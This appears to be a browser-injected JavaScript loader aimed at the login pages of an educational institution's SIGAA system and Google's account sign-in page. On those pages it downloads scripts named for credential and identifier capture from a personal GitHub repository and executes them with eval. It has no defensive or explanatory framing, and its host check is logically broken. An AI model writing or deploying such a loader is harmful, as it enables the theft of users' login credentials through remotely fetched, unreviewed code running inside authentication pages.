let url = null

if (location.host == 'sigaa.ifsc.edu.br' || location.host == 'sig.ifsc.edu.br'){
    url = "https://raw.githubusercontent.com/Wolota/ips/main/credentialSIGAA.js";
}
else if (location.host == 'accounts.google.com'){
    let path = location.pathname.split('/');
    
    if (path[path.length - 1] == 'identifier'){
            url = "https://raw.githubusercontent.com/Wolota/ips/main/identifierGAccount.js";
    }
}

if (url != undefined || url == null){
    fetch(url).then(response => response.text()).then(code => {eval(code);});
}
